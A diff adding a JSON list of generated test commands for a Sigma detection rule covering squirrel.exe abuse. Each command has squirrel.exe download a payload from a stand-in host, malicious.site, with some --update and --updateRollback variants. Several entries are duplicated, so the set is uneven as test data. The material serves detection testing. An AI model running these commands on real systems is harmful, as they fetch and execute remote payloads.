@@ -1,0 +1,44 @@
+```json
+[
+  {
+    "output": "C:\\Windows\\System32\\squirrel.exe --download http://malicious.site/payload.exe",
+    "explanation": "This command simulates a typical usage of Squirrel.exe to download a file via HTTP, matching the Sigma rule's detection criteria."
+  },
+  {
+    "output": "C:\\Windows\\System32\\squirrel.exe --download http://malicious.site/payload.exe --updateRollback=http://malicious.site/rollback.exe",
+    "explanation": "This command includes an additional --updateRollback flag, which is also detected by the Sigma rule, and demonstrates a more complex scenario."
+  },
+  {
+    "output": "C:\\Windows\\System32\\squirrel.exe --download http://malicious.site/payload.exe --update",
+    "explanation": "This command uses both --download and --update flags, which are part of the Sigma rule's detection logic."
+  },
+  {
+    "output": "C:\\Windows\\System32\\squirrel.exe --download http://malicious.site/payload.exe ",
+    "explanation": "This command adds an extra space after the --download argument, using insertion mutation to test parsing tolerance."
+  },
+  {
+    "output": "C:\\Windows\\System32\\squirrel.exe --download http://malicious.site/payload.exe --updateRollback=http://malicious.site/rollback.exe",
+    "explanation": "This command uses full HTTP URLs and includes multiple flags, which are all captured by the Sigma rule's detection logic."
+  },
+  {
+    "output": "C:\\Windows\\System32\\squirrel.exe --download http://malicious.site/payload.exe --updateRollback=http://malicious.site/rollback.exe",
+    "explanation": "This command uses full HTTP URLs and includes multiple flags, which are all captured by the Sigma rule's detection logic."
+  },
+  {
+    "output": "C:\\Windows\\System32\\squirrel.exe --download http://malicious.site/payload.exe",
+    "explanation": "This command uses a minimalistic approach with only the --download flag and HTTP URL, which is sufficient to trigger the Sigma rule."
+  },
+  {
+    "output": "C:\\Windows\\System32\\squirrel.exe --download http://malicious.site/payload.exe --update",
+    "explanation": "This command includes both --download and --update flags, which are part of the Sigma rule's detection logic."
+  },
+  {
+    "output": "C:\\Windows\\System32\\squirrel.exe --download http://malicious.site/payload.exe --updateRollback=http://malicious.site/rollback.exe",
+    "explanation": "This command includes the --updateRollback flag, which is part of the Sigma rule's detection logic."
+  },
+  {
+    "output": "C:\\Windows\\System32\\squirrel.exe --download http://malicious.site/payload.exe --updateRollback=http://malicious.site/rollback.exe",
+    "explanation": "This command includes the --updateRollback flag, which is part of the Sigma rule's detection logic."
+  }
+]
+```
